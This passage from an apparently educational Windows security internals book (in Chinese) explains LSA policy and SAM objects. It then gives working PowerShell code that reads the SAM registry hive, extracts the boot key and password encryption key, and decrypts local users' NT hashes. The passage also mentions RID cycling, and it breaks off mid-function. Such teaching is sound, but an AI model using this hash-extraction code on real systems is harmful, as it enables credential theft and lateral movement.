最后一种对象类型是*别名对象*。这些对象代表了你更为熟悉的组，因为它们是`Get-LocalGroup`命令返回的底层类型。例如，*BUILTIN*域对象包含诸如*BUILTIN\Administrators*这样的组别名，该别名仅在本地Windows系统上使用。

如代码清单 10-13所示，我们可以使用`Get-SamAlias`命令枚举域中的别名，并使用`Get-SamAliasMember`查询其成员。




```
PS> Get-SamAlias -Domain $domain -InfoOnly
Name          Sid
----          ---
❶ Awesome Users S-1-5-21-1653919079-861867932-2690720175-101

❷ PS> $alias = Get-SamAlias -Domain $domain -Name "Awesome Users"
❸ PS> Get-SamAliasMember -Alias $alias
Name                     Sid
----                     ---
NT AUTHORITY\INTERACTIVE S-1-5-4
GRAPHITE\admin           S-1-5-21-2318445812-3516008893-216915059-1001
```


*代码清单 10-13：列出域别名对象并枚举成员*

在此例中，本地域中唯一的别名是*Awesome Users*❶。要查看其成员列表，我们可以按名称打开该别名❷，并使用`Get-SamAliasMember`命令❸。请注意，每个成员都存储了完整的SID，这意味着（与组不同）别名的成员可以来自不同的域。这使得别名作为分组机制更加有用，也解释了为什么Windows会尽力隐藏组对象。

组对象和别名对象支持相同的访问权限，尽管原始访问掩码值有所不同。你可以对这两种对象请求以下类型的访问权限：

AddMember  允许向对象添加新成员

RemoveMember  允许从对象中移除成员

ListMembers  允许列出对象的成员

ReadInformation  允许读取对象的属性

WriteAccount  允许写入对象的属性

至此，我们完成了对SAM远程服务的讨论。接下来，让我们快速了解一下第二个远程服务，它允许你访问域策略。

#### 域策略远程服务

微软在*MS-LSAD*中记录了用于访问LSA策略（从而访问SECURITY数据库）的协议。我们可以使用`LsaOpenPolicy` Win32 API连接到LSA策略，该API返回一个句柄供后续调用使用。PowerShell通过`Get-LsaPolicy`命令公开此API，如代码清单 10-14所示。




```
PS> $policy = Get-LsaPolicy
PS> Format-NtSecurityDescriptor $policy -Summary
<Owner> : BUILTIN\Administrators
<Group> : NT AUTHORITY\SYSTEM
<DACL>
NT AUTHORITY\ANONYMOUS LOGON: (Denied)(None)(LookupNames)
BUILTIN\Administrators: (Allowed)(None)(Full Access)
Everyone: (Allowed)(None)(ViewLocalInformation|LookupNames|ReadControl)
NT AUTHORITY\ANONYMOUS LOGON: (Allowed)(None)(ViewLocalInformation|LookupNames)
--snip--
```


*代码清单 10-14：打开LSA策略，查询其安全描述符，并查找SID*

首先，我们在本地系统上打开LSA策略。如果访问的不是本地系统，可以使用`SystemName`参数指定要访问的系统。LSA策略是一个可安全保护的对象，我们可以查询其安全描述符，如这里所示，前提是我们具有`ReadControl`访问权限。

调用`Get-LsaPolicy`命令时，可以通过`Access`参数指定以下一种或多种打开策略的访问权限：

ViewLocalInformation  允许查看策略信息

ViewAuditInformation  允许查看审计信息

GetPrivateInformation  允许查看私有信息

TrustAdmin  允许管理域信任配置

CreateAccount  允许创建新的账户对象

CreateSecret  允许创建新的机密对象

CreatePrivilege  允许创建新的特权（不支持）

SetDefaultQuotaLimits  允许设置默认配额限制（不支持）

SetAuditRequirements  允许设置审计事件配置

AuditLogAdmin  允许管理审计日志

ServerAdmin  允许管理服务器配置

LookupNames  允许查找账户的SID或名称

Notification  允许接收策略更改的通知

有了策略对象和适当的访问权限，你就可以管理服务器的配置。你还可以查找并打开SECURITY数据库中的三种对象类型，如图10-6所示：账户、机密和受信任域。以下各节将描述这些对象。

##### 账户对象

*账户对象*与我们通过SAM远程服务访问的用户对象不同。账户对象不需要与注册的用户账户关联；相反，它用于配置我们之前讨论的账户权限。例如，如果你想为某个用户账户分配特定特权，必须确保该用户的SID存在对应的账户对象，然后将该特权添加到该对象中。

如果你对策略对象具有`CreateAccount`访问权限，可以使用`LsaCreateAccount` API创建新的账户对象。但通常你不需要直接这样做。相反，你通常会从LSA策略访问账户对象，如代码清单 10-15所示。




```
❶ PS> $policy = Get-LsaPolicy -Access ViewLocalInformation
❷ PS> Get-LsaAccount -Policy $policy -InfoOnly
Name                                Sid
----                                ---
Window Manager\Window Manager Group S-1-5-90-0
NT VIRTUAL MACHINE\Virtual Machines S-1-5-83-0
NT SERVICE\ALL SERVICES             S-1-5-80-0
NT AUTHORITY\SERVICE                S-1-5-6
BUILTIN\Performance Log Users       S-1-5-32-559
--snip--

PS> $sid = Get-NtSid -KnownSid BuiltinUsers
❸ PS> $account = Get-LsaAccount -Policy $policy -Sid $sid
PS> Format-NtSecurityDescriptor -Object $account -Summary
<Owner> : BUILTIN\Administrators
<Group> : NT AUTHORITY\SYSTEM
<DACL>
❹ BUILTIN\Administrators: (Allowed)(None)(Full Access)
Everyone: (Allowed)(None)(ReadControl)
```


*代码清单 10-15：列出并打开LSA账户对象*

我们首先以 `ViewLocalInformation` 访问权限打开策略 ❶，然后使用 `Get-LsaAccount` PowerShell 命令枚举账户对象 ❷。您可以看到，输出列出了内部组，而不是我们本章前面检查的本地用户，并返回了每个组的名称和 SID。

然后，您可以通过 SID 打开账户对象；例如，这里我们打开内置用户的账户对象 ❸。账户对象是可安全保护的，并具有关联的安全描述符，您可以查询该描述符。在这种情况下，从格式化输出中可以看到，只有 *Administrators* 组对账户拥有完全访问权限 ❹。唯一的另一个 ACE 授予 *Everyone* 组 `ReadControl` 权限，这防止了账户权限被枚举。如果安全描述符允许，账户对象可以被分配以下访问权限：

View  启用查看账户对象的信息，如特权和登录权限

AdjustPrivileges  启用调整已分配的特权

AdjustQuotas  启用调整用户配额

AdjustSystemAccess  启用调整已分配的登录权限

如果我们以管理员身份重新运行 代码清单 10-15 中的命令，我们就可以使用账户对象来枚举特权和登录权限，如 代码清单 10-16 所示。




```
PS> $account.Privileges
Name                          Luid              Enabled
----                          ----              -------
SeChangeNotifyPrivilege       00000000-00000017 False
SeIncreaseWorkingSetPrivilege 00000000-00000021 False
SeShutdownPrivilege           00000000-00000013 False
SeUndockPrivilege             00000000-00000019 False
SeTimeZonePrivilege           00000000-00000022 False

PS> $account.SystemAccess
InteractiveLogon, NetworkLogon
```


*代码清单 10-16：枚举特权和登录权限*

这里有趣的是，特权和登录权限以不同的方式列出，尽管您之前看到账户权限以类似于特权的方式表示：使用名称来标识要分配的权利。对于账户对象，特权存储为 LUID 列表，这与 Token 对象使用的格式相同。然而，登录权限存储在 `SystemAccess` 属性中的一组位标志中。

这种差异是由于 Microsoft 设计账户权限 API 的方式所致，这些 API 被 `Get-NtAccountRight` 及相关命令使用。这些 API 将各种账户权限和特权合并为一个，使开发人员更容易编写正确的代码。我建议使用 `Get-NtAccountRight` 或底层 API，而不是直接访问 LSA 策略来检查和修改账户权限。

##### 秘密对象

LSA 可以为系统上的其他服务以及自身维护秘密数据。它通过 *秘密对象* 公开这些数据。要创建新的秘密对象，您需要对策略拥有 `CreateSecret` 访问权限。代码清单 10-17 展示了如何打开和检查现有的 LSA 秘密对象。请以管理员身份运行这些命令。




```
PS> $policy = Get-LsaPolicy
❶ PS> $secret = Get-LsaSecret -Policy $policy -Name "DPAPI_SYSTEM"
❷ PS> Format-NtSecurityDescriptor $secret -Summary
<Owner> : BUILTIN\Administrators
<Group> : NT AUTHORITY\SYSTEM
<DACL>
BUILTIN\Administrators: (Allowed)(None)(Full Access)
Everyone: (Allowed)(None)(ReadControl)

❸ PS> $value = $secret.Query()
PS> $value
CurrentValue    CurrentValueSetTime  OldValue        OldValueSetTime
------------    -------------------  --------        ---------------
{1, 0, 0, 0...} 3/12/2021 1:46:08 PM {1, 0, 0, 0...} 11/18 11:42:47 PM

❹ PS> $value.CurrentValue | Out-HexDump -ShowAll
          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 01 00 00 00 3B 14 CB FB B0 83 3D DF 98 A5 42 F9  - ....;.....=...B.
00000010: 65 64 4B B5 95 63 E1 E8 9C C8 00 C0 80 0C 71 E0  - edK..c........q.
00000020: C3 46 B1 43 A4 96 0E 65 5E B1 EC 46              - .F.C...e^..F
```


*代码清单 10-17：打开和检查 LSA 秘密*

我们首先打开策略，然后使用 `Get-LsaSecret` 命令按名称打开一个秘密 ❶。没有 API 可以枚举存储的秘密；您必须知道它们的名称才能打开它们。在这种情况下，我们打开一个应该存在于每个系统上的秘密：*数据保护 API (DPAPI)* 主密钥，名为 *DPAPI_SYSTEM*。DPAPI 用于基于用户密码加密数据。为了使其正常工作，它需要一个系统主密钥。

由于秘密是可安全保护的，我们可以检查其安全描述符 ❷，它可以分配以下访问权限：

SetValue  启用设置秘密的值

QueryValue  启用查询秘密的值

如果您拥有 `QueryValue` 访问权限，您可以使用 `Query` 方法检查密钥的内容，如我们在 代码清单 10-17 中所做的 ❸。秘密包含当前值和先前值，以及这些值设置的时间戳。在这里，我们以十六进制显示当前值 ❹。秘密值的内容由 DPAPI 定义，我们不会在本书中进一步深入探讨。

##### 受信任域对象

SECURITY 数据库中的最后一种对象类型是 *受信任域对象*。这些对象描述了林中域之间的信任关系。尽管域策略远程服务是为 Active Directory 引入之前的域设计的，但它仍然可以用于查询现代域控制器上的信任关系。

代码清单 10-18 展示了如何在域控制器上打开策略，然后查询受信任域列表的示例。




```
PS> $policy = Get-LsaPolicy -ServerName "PRIMARYDC"
PS> Get-LsaTrustedDomain -Policy $policy -InfoOnly
Name                      TrustDirection TrustType
----                      -------------- ---------
engineering.mineral.local BiDirectional  Uplevel
sales.mineral.local       BiDirectional  Uplevel
```


*代码清单 10-18：枚举域控制器的信任关系*

要检查和配置信任关系，应使用Active Directory命令，而非域策略远程服务的命令。因此，我不再深入探讨这些对象；我们将在下一章回到检查信任关系的主题。

> 注意
>
> *尽管受信任域是可安全保护的对象，但其安全描述符无法通过任何远程服务API进行配置；尝试这样做将产生错误。这是因为安全性由Active Directory实现，而非LSA。*

##### 名称查找与映射

如果你获得LookupNames访问权限，域策略远程服务将允许你将SID转换为名称，反之亦然。例如，如代码清单 10-19所示，你可以使用`Get-LsaName` PowerShell命令指定一个或多个SID，以接收相应的用户和域。你也可以指定一个名称，并使用`Get-LsaSid`接收SID。




```
PS> $policy = Get-LsaPolicy -Access LookupNames
PS> Get-LsaName -Policy $policy -Sid "S-1-1-0", "S-1-5-32-544"
Domain  Name           Source  NameUse
------  ----           ------  -------
        Everyone       Account WellKnownGroup
BUILTIN Administrators Account Alias

PS> Get-LsaSid -Policy $policy -Name "Guest" | Select-Object Sddl
Sddl
----
S-1-5-21-1653919079-861867932-2690720175-501
```


*代码清单 10-19：从策略中查找SID或名称*

在Windows 10之前，未认证用户可以使用查找API枚举系统上的用户，因为匿名用户获得了LookupNames访问权限。这是一个问题，因为攻击者可以通过*RID循环*暴力破解系统上的有效用户。如你在代码清单 10-14中所见，当前版本的Windows明确拒绝了LookupNames访问权限。然而，对于已认证的非管理员域用户，RID循环仍然是一种有用的技术，因为非管理员无法使用SAM远程服务。

还可以添加从SID到名称的映射，即使它们不是众所周知的SID或SAM数据库中的注册账户。Win32 API `LsaManageSidNameMapping`控制此功能。它被SCM（在第3章中讨论）用于设置服务特定的SID以控制资源访问，你也可以自己使用它，但会遇到以下限制：

- 调用者需要启用SeTcbPrivilege特权，并且必须与LSA位于同一系统上。
- 要映射的SID必须位于NT安全机构中。
- SID的第一个RID必须在80到111之间（包括这些值）。
- 必须先注册域SID，然后才能在该域中添加子SID。

你可以调用`LsaManageSidNameMapping` API，使用`Add-NtSidName`和`Remove-NtSidName` PowerShell命令添加或删除映射。代码清单 10-20展示了如何以管理员身份向LSA添加SID到名称的映射。




```
❶ PS> $domain_sid = Get-NtSid -SecurityAuthority Nt -RelativeIdentifier 99
❷ PS> $user_sid = Get-NtSid -BaseSid $domain_sid -RelativeIdentifier 1000
PS> $domain = "CUSTOMDOMAIN"
PS> $user = "USER"
PS> Invoke-NtToken -System {
  ❸ Add-NtSidName -Domain $domain -Sid $domain_sid -Register
    Add-NtSidName -Domain $domain -Name $user -Sid $user_sid -Register
  ❹ Use-NtObject($policy = Get-LsaPolicy) {
        Get-LsaName -Policy $policy -Sid $domain_sid, $user_sid
    }
  ❺ Remove-NtSidname -Sid $user_sid -Unregister
    Remove-NtSidName -Sid $domain_sid -Unregister
}
Domain       Name      Source  NameUse
------       ----      ------  -------
CUSTOMDOMAIN           Account Domain
CUSTOMDOMAIN USER      Account WellKnownGroup
```


*代码清单 10-20：添加和删除SID到名称的映射*

我们首先定义RID为99的域SID ❶，然后基于该域SID创建RID为1000的用户SID ❷。我们正在模拟*SYSTEM*用户，因此我们拥有SeTcbPrivilege特权，这意味着我们可以使用带有Register参数的`Add-NtSidName`命令来添加映射❸。（回想一下，你需要先注册域，然后再添加用户。）然后我们使用策略检查LSA的SID映射❹。最后，我们删除SID到名称的映射以清理我们所做的更改❺。

这结束了我们对LSA策略的讨论。现在让我们看看两个配置数据库SAM和SECURITY是如何在本地存储的。

### SAM 和 SECURITY 数据库

你已经了解了如何通过远程服务访问 SAM 和 SECURITY 数据库。然而，你会发现直接探索这些数据库在本地如何以注册表项的形式存储是很有启发性的。通过直接访问数据库，你可以获取远程服务未暴露的信息，例如密码哈希。

警告

*这些注册表项并非设计为可直接访问，因此它们存储用户和策略配置的方式可能随时更改。请记住，本节提供的描述在你阅读时可能已不再准确。此外，由于直接访问是恶意软件常用的技术，你尝试运行的本节脚本代码很可能会被系统上运行的任何防病毒产品阻止。*

#### 通过注册表访问 SAM 数据库

让我们从 SAM 数据库开始，它位于注册表中的 *REGISTRY\MACHINE\SAM*。该数据库受到保护，只有 *SYSTEM* 用户才能读写其注册表项。你可以使用 Start-Win32ChildProcess 命令以 *SYSTEM* 用户身份运行 PowerShell，然后通过这种方式访问注册表，但有一种更简单的方法。

作为管理员，我们可以通过启用 SeBackupPrivilege 来绕过注册表上的读取访问检查。如果我们在启用此特权时创建一个新的对象管理器驱动器提供程序，就可以使用 shell 检查 SAM 数据库注册表项。以管理员身份运行 代码清单 10-21 中的命令。




```
PS> Enable-NtTokenPrivilege SeBackupPrivilege
PS> New-PSDrive -PSProvider NtObjectManager -Name SEC -Root ntkey:MACHINE
PS> ls -Depth 1 -Recurse SEC:\SAM\SAM
Name                    TypeName
----                    --------
SAM\SAM\Domains         Key
SAM\SAM\LastSkuUpgrade  Key
SAM\SAM\RXACT           Key
❶ SAM\SAM\Domains\Account Key
❷ SAM\SAM\Domains\Builtin Key
```


*代码清单 10-21：使用 SeBackupPrivilege 映射* MACHINE *注册表项并列出 SAM 数据库注册表项*

我们首先启用 SeBackupPrivilege。启用该特权后，我们可以使用 New-PSDrive 命令将 *MACHINE* 注册表项的视图映射到 *SEC:* 驱动器。这使驱动器能够利用 SeBackupPrivilege 绕过安全检查。

我们可以使用正常的 PowerShell 命令列出 SAM 数据库注册表项的内容。两个最重要的项是 *Account* ❶ 和 *Builtin* ❷。*Account* 项代表我们通过 SAM 远程服务访问的本地域，并包含本地用户和组的详细信息。*Builtin* 项包含本地内置组；例如，*BUILTIN\Administrators*。

##### 提取用户配置

让我们利用对 SAM 数据库注册表项的访问权限来提取用户帐户的配置。代码清单 10-22 展示了如何检查用户的配置。以管理员身份运行这些命令。




```
PS> $key = Get-Item SEC:\SAM\SAM\Domains\Account\Users\000001F4 ❶
PS> $key.Values ❷
Name                    Type   DataObject
----                    ----   ----------
F                       Binary {3, 0, 1, 0...}
V                       Binary {0, 0, 0, 0...}
SupplementalCredentials Binary {0, 0, 0, 0...}

PS> function Get-VariableAttribute($key, [int]$Index) {
    $MaxAttr = 0x11
    $V = $key["V"].Data
    $base_ofs = $Index * 12
    $curr_ofs = [System.BitConverter]::ToInt32($V, $base_ofs) + ($MaxAttr * 12)
    $len = [System.BitConverter]::ToInt32($V, $base_ofs + 4)

    if ($len -gt 0) {
       $V[$curr_ofs..($curr_ofs+$len-1)]
    } else {
        @()
    }
}

PS> $sd = Get-VariableAttribute $key -Index 0 ❸
PS> New-NtSecurityDescriptor -Byte $sd
Owner                  DACL ACE Count SACL ACE Count Integrity Level
-----                  -------------- -------------- ---------------
BUILTIN\Administrators 4              2              NONE

PS> Get-VariableAttribute $key -Index 1 | Out-HexDump -ShowAll ❹
                   00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 41 00 64 00 6D 00 69 00 6E 00 69 00 73 00 74 00  - A.d.m.i.n.i.s.t.
00000010: 72 00 61 00 74 00 6F 00 72 00                    - r.a.t.o.r.

PS> $lm = Get-VariableAttribute $key -Index 13 ❺
PS> $lm | Out-HexDump -ShowAddress
00000000: 03 00 02 00 00 00 00 00 4B 70 1B 49 1A A4 F9 36
00000010: 81 F7 4D 52 8A 1B A5 D0

PS> $nt = Get-VariableAttribute $key -Index 14 ❻
PS> $nt | Out-HexDump -ShowAddress
00000000: 03 00 02 00 10 00 00 00 CA 15 AB DA 31 00 2A 72
00000010: 6E 4B CE 89 27 7E A6 F6 D8 19 CE B7 58 AC 93 F5
00000020: D1 89 73 FB B2 C3 AA 41 95 FE 6F F8 B7 58 37 09
00000030: 0D 4B E2 4C DB 37 3F 91
```


*代码清单 10-22：显示默认管理员用户的数据*

注册表项将用户信息存储在键中，键名是用户在域中 RID 的十六进制表示。例如，在 代码清单 10-22 中，我们查询 *Administrator* 用户，该用户的 RID 始终为十进制的 500。因此，我们知道它将存储在键 000001F4 中，即 RID 的十六进制形式 ❶。你也可以列出 *Users* 键以查找其他用户。

该键包含少量二进制值 ❷。在此示例中，我们有三个值：F 值，即用户的一组固定大小属性；V 值，即一组可变大小属性；以及 SupplementalCredentials，可用于存储除 NT 哈希之外的凭据，例如在线帐户或生物识别信息。

在可变大小属性值的开头是一个属性索引表。每个索引条目都有偏移量、大小和附加标志。重要的用户数据存储在这些索引中：

**索引 0**    用户对象的安全描述符 ❸

**索引 1**    用户名 ❹

**索引 13**    用户的 LM 哈希 ❺

**索引 14**    用户的 NT 哈希 ❻

LM 和 NT 哈希值并非以明文存储；LSA 使用多种加密算法（如 RC4 和高级加密标准 (AES)）对其进行混淆。让我们开发一些代码来提取用户的哈希值。

##### 提取SysKey

在 Windows NT 的原始版本中，你只需要 SAM 数据库注册表项即可解密 NT 哈希。在 Windows 2000 及更高版本中，你需要额外的密钥，即 *LSA 系统密钥*，它隐藏在 *SYSTEM* 注册表项中。该密钥也用于 SECURITY 数据库注册表项中值的混淆机制。

提取 NT 哈希的第一步是将系统密钥提取为可用的形式。代码清单 10-23 展示了一个示例。


```
PS> function Get-LsaSystemKey {
  ❶ $names = "JD", "Skew1", "GBG", "Data"
    $keybase = "NtKey:\MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\"
    $key = $names | ForEach-Object {
        $key = Get-Item "$keybase\$_"
     ❷ $key.ClassName | ConvertFrom-HexDump
    }
  ❸ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 |
ForEach-Object {
        $key[$_]
    }
}
❹ PS> Get-LsaSystemKey | Out-HexDump
3E 98 06 D8 E3 C7 12 88 99 CF F4 1D 5E DE 7E 21
```

*代码清单 10-23：提取混淆后的 LSA 系统密钥*

该密钥以四个独立部分存储在 LSA 配置密钥中❶。为了增加一层混淆，这些部分并非以注册表值的形式存储；相反，它们是以十六进制文本字符串的形式存储在很少使用的注册表键类名值中。我们可以使用 `ClassName` 属性提取这些值，然后将其转换为字节❷。

随后，我们必须使用固定的排序方式对启动密钥的字节值进行置换，以生成最终密钥❸。我们可以运行 `Get-LsaSystemKey` PowerShell 命令来显示这些字节❹。请注意，该密钥的值是系统特定的，因此您看到的输出几乎肯定会有所不同。

一个有趣的现象是，获取启动密钥并不需要管理员权限。这意味着，任意文件读取漏洞可能使非管理员能够提取支持 *SAM* 和 *SECURITY* 注册表键的注册表配置单元文件，并解密其内容（这似乎并不是纵深防御的一个特别好的应用）。

##### 解密密码加密密钥

去混淆过程的下一步是使用系统密钥解密 *密码加密密钥（PEK）*。PEK 用于加密我们在代码清单 10-22中提取的用户哈希值。在代码清单 10-24中，我们定义了用于解密 PEK 的函数。

```
PS> function Unprotect-PasswordEncryptionKey {
  ❶ $key = Get-Item SEC:\SAM\SAM\Domains\Account
    $fval = $key["F"].Data

  ❷ $enctype = [BitConverter]::ToInt32($fval, 0x68)
    $endofs = [BitConverter]::ToInt32($fval, 0x6C) + 0x68
    $data = $fval[0x70..($endofs-1)]
  ❸ switch($enctype) {
        1 {Unprotect-PasswordEncryptionKeyRC4 -Data $data}
        2 {Unprotect-PasswordEncryptionKeyAES -Data $data}
        default {throw "Unknown password encryption format"}
    }
}
```

*代码清单 10-24：定义 Unprotect-PasswordEncryptionKey 解密函数*

首先，我们查询包含与 PEK 关联的数据的注册表值❶。接下来，我们在固定属性的注册表变量中偏移量 `0x68` 处找到加密的 PEK❷（请记住，此位置可能会改变）。第一个 32 位整数表示所使用的加密类型，即 RC4 或 AES128。第二个 32 位整数是尾部加密 PEK 的长度。我们提取数据，然后调用特定于算法的解密函数❸。

让我们来看一下解密函数。代码清单 10-25 展示了如何使用 RC4 解密密码。

```
❶ PS> function Get-MD5Hash([byte[]]$Data) {
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $md5.ComputeHash($Data)
}

PS> function Get-StringBytes([string]$String) {
    [System.Text.Encoding]::ASCII.GetBytes($String + "`0")
}

PS> function Compare-Bytes([byte[]]$Left, [byte[]]$Right) {
    [Convert]::ToBase64String($Left) -eq [Convert]::ToBase64String($Right)
}

❷ PS> function Unprotect-PasswordEncryptionKeyRC4([byte[]]$Data) {
  ❸ $syskey = Get-LsaSystemKey
    $qiv = Get-StringBytes '!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%'
    $niv = Get-StringBytes '0123456789012345678901234567890123456789'
    $rc4_key = Get-MD5Hash -Data ($Data[0..15] + $qiv + $syskey + $niv)

  ❹ $decbuf = Unprotect-RC4 -Data $data -Offset 0x10 -Length 32 -Key $rc4_key
    $pek = $decbuf[0..15]
    $hash = $decbuf[16..31]

  ❺ $pek_hash = Get-MD5Hash -Data ($pek + $niv + $pek + $qiv)
    if (!(Compare-Bytes $hash $pek_hash)) {
       throw "Invalid password key for RC4."
    }

    $pek
}
```

*代码清单 10-25：使用 RC4 解密密码加密密钥*

我们首先为解密过程创建一些辅助函数，例如 `Get-MD5Hash`，它计算 MD5 哈希❶。然后我们开始解密❷。传递给 `Unprotect-PasswordEncryptionKeyRC4` 函数的 `$Data` 参数是从固定属性缓冲区中提取的值。

该函数构造一个长的二进制字符串，其中包含加密数据的前 16 个字节（一个 *初始化向量*，用于随机化加密数据），以及两个固定字符串和系统密钥❸。

然后使用 MD5 算法对该二进制字符串进行哈希处理，以生成用于 RC4 加密的密钥，我们使用该密钥解密加密数据的剩余 32 个字节❹。解密后的前 16 个字节是 PEK，后 16 个字节是用于验证解密是否正确的 MD5 哈希。我们检查哈希值❺以确保成功解密了 PEK。如果哈希值不正确，我们将抛出异常以指示失败。

在代码清单 10-26中，我们定义了使用 AES 解密 PEK 的函数。

```
❶ PS> function Unprotect-AES([byte[]]$Data, [byte[]]$IV, [byte[]]$Key) {
     $aes = [System.Security.Cryptography.Aes]::Create()
     $aes.Mode = "CBC"
     $aes.Padding = "PKCS7"
     $aes.Key = $Key
     $aes.IV = $IV
     $aes.CreateDecryptor().TransformFinalBlock($Data, 0, $Data.Length)
}

PS> function Unprotect-PasswordEncryptionKeyAES([byte[]]$Data) {
   ❷ $syskey = Get-LsaSystemKey
     $hash_len = [System.BitConverter]::ToInt32($Data, 0)
     $enc_len = [System.BitConverter]::ToInt32($Data, 4)
   ❸ $iv = $Data[0x8..0x17]
     $pek = Unprotect-AES -Key $syskey -IV $iv -Data $Data[0x18..(0x18+$enc_len-1)]

   ❹ $hash_ofs = 0x18+$enc_len
     $hash_data = $Data[$hash_ofs..($hash_ofs+$hash_len-1)]
     $hash = Unprotect-AES -Key $syskey -IV $iv -Data $hash_data

   ❺ $sha256 = [System.Security.Cryptography.SHA256]::Create()
     $pek_hash = $sha256.ComputeHash($pek)
     if (!(Compare-Bytes $hash $pek_hash)) {
         throw "Invalid password key for AES."
     }

     $pek
}
```

*代码清单 10-26：使用 AES 解密密码加密密钥*

我们首先定义一个函数，用于使用指定的密钥和初始化向量（IV）解密 AES 缓冲区❶。解密过程使用 AES 的密码块链接（CBC）模式，并采用 PKCS7 填充。我建议您查阅这些模式的工作原理，但它们的细节对于本次讨论并不重要；只需注意必须正确设置它们，否则解密过程将失败。

现在我们定义密码解密函数。用于 AES 的密钥是系统密钥❷，IV 是短头部之后数据的前 16 个字节❸，加密数据紧随其后。要解密的数据长度作为头部中的一个值存储。

与 RC4 一样，加密数据包含一个加密的哈希值，我们可以用它来验证解密是否成功。我们解密该值❹，然后生成 PEK 的 SHA256 哈希以进行验证❺。如果解密和验证成功，我们现在就拥有了一个解密后的 PEK。

在代码清单 10-27中，我们使用 `Unprotect-PasswordEncryptionKey` 函数来解密密码密钥。

```
PS> Unprotect-PasswordEncryptionKey | Out-HexDump
E1 59 B0 6A 50 D9 CA BE C7 EA 6D C5 76 C3 7A C5
```

*代码清单 10-27：测试密码加密密钥解密*

同样，实际生成的值在不同系统上会有所不同。另外请注意，无论用于存储的加密算法是什么，PEK 的大小始终为 16 字节。

##### 解密密码哈希

现在我们有了 PEK，就可以解密在 代码清单 10-22 中从用户对象提取的密码哈希了。代码清单 10-28 定义了用于解密密码哈希的函数。




```
PS> function Unprotect-PasswordHash([byte[]]$Key, [byte[]]$Data,
[int]$Rid, [int]$Type) {
    $enc_type = [BitConverter]::ToInt16($Data, 2)
    switch($enc_type) {
        1 {Unprotect-PasswordHashRC4 -Key $Key -Data $Data -Rid $Rid -Type $Type}
        2 {Unprotect-PasswordHashAES -Key $Key -Data $Data}
        default {throw "Unknown hash encryption format"}
    }
}
```


*代码清单 10-28：解密密码哈希*

Unprotect-PasswordHash 函数接受我们解密的 PEK、加密的哈希数据、用户的 RID 以及哈希类型作为参数。LM 哈希的 Type 值为 1，而 NT 哈希的 Type 值为 2。

哈希数据存储了加密类型；与 PEK 一样，支持的加密算法为 RC4 和 AES128。请注意，PEK 可能使用 RC4 加密，而密码哈希使用 AES 加密，反之亦然。允许混合使用加密类型，使得系统在用户更改密码时，可以将旧的哈希值从 RC4 迁移到 AES。

我们调用特定算法的解密函数来解密哈希。请注意，只有 RC4 解密函数需要我们传递 RID 和哈希类型；AES128 解密函数不需要这两个值。

我们首先在 代码清单 10-29 中实现 RC4 哈希解密。




```
PS> function Unprotect-PasswordHashRC4([byte[]]$Key, [byte[]]$Data,
[int]$Rid, [int]$Type) {
  ❶ if ($Data.Length -lt 0x14) {
        return @()
    }
  ❷ $iv = switch($Type) {
        1 {"LMPASSWORD"}
        2 {"NTPASSWORD"}
        3 {"LMPASSWORDHISTORY"}
        4 {"NTPASSWORDHISTORY"}
        5 {"MISCCREDDATA"}
    }
  ❸ $key_data = $Key + [BitConverter]::GetBytes($Rid) + (Get-StringBytes $iv)
    $rc4_key = Get-MD5Hash -Data $key_data
  ❹ Unprotect-RC4 -Key $rc4_key -Data $Data -Offset 4 -Length 16
}
```


*代码清单 10-29：使用 RC4 解密密码哈希*

我们首先检查数据的长度 ❶。如果长度小于 20 字节，我们假定哈希不存在。例如，在现代版本的 Windows 上，默认不存储 LM 哈希，因此尝试解密该哈希将返回一个空数组。

假设存在要解密的哈希，我们随后需要根据要解密的哈希类型构造一个 IV 字符串 ❷。除了 LM 和 NT 哈希之外，LSA 还可以解密其他几种哈希类型，例如密码历史记录，它存储以前的密码哈希，以防止用户改回旧密码。

我们通过将 PEK、字节形式的 RID 和 IV 字符串连接起来构建一个密钥，并使用它生成 MD5 哈希 ❸。然后我们使用这个新密钥最终解密密码哈希 ❹。

使用 AES 解密密码比使用 RC4 更简单，如 代码清单 10-30 所示。




```
PS> function Unprotect-PasswordHashAES([byte[]]$Key, [byte[]]$Data) {
  ❶ $length = [BitConverter]::ToInt32($Data, 4)
    if ($length -eq 0) {
        return @()
    }
  ❷ $IV = $Data[8..0x17]
    $value = $Data[0x18..($Data.Length-1)]
  ❸ Unprotect-AES -Key $Key -IV $IV -Data $value
}
```


*代码清单 10-30：使用 AES 解密密码哈希*

密码包含数据长度，我们用它来确定是否需要返回空缓冲区 ❶。然后我们可以从缓冲区中提取 IV ❷ 和加密值，并使用 PEK 解密该值 ❸。

代码清单 10-31 解密 LM 和 NT 哈希。




```
PS> $pek = Unprotect-PasswordEncryptionKey
PS> $lm_dec = Unprotect-PasswordHash -Key $pek -Data $lm -Rid 500 -Type 1
PS> $lm_dec | Out-HexDump
❶
PS> $nt_dec = Unprotect-PasswordHash -Key $pek -Data $nt -Rid 500 -Type 2
PS> $nt_dec | Out-HexDump
❷ 40 75 5C F0 7C B3 A7 17 46 34 D6 21 63 CE 7A DB
```


*代码清单 10-31：解密 LM 和 NT 哈希*

请注意，在此示例中没有 LM 哈希，因此解密过程返回一个空数组 ❶。然而，NT 哈希解密为一个 16 字节的值 ❷。

##### 去混淆密码哈希

我们现在有了一个解密的密码哈希，但为了检索原始哈希，还需要执行最后一步。密码哈希仍然使用数据加密标准（DES）算法加密。DES 是在系统密钥引入之前，原始 NT 版本中哈希的原始混淆机制。所有这些 RC4 和 AES 解密只是让我们回到了起点。

我们首先需要生成 DES 密钥来解密哈希值（代码清单 10-32）。




```
PS> function Get-UserDESKey([uint32]$Rid) {
     $ba = [System.BitConverter]::GetBytes($Rid)
     $key1 = ConvertTo-DESKey $ba[2], $ba[1], $ba[0], $ba[3], $ba[2], $ba[1], 
$ba[0]
     $key2 = ConvertTo-DESKey $ba[1], $ba[0], $ba[3], $ba[2], $ba[1], $ba[0], 
$ba[3]
    $key1, $key2
}

PS> function ConvertTo-DESKey([byte[]]$Key) {
     $k = [System.BitConverter]::ToUInt64($Key + 0, 0)
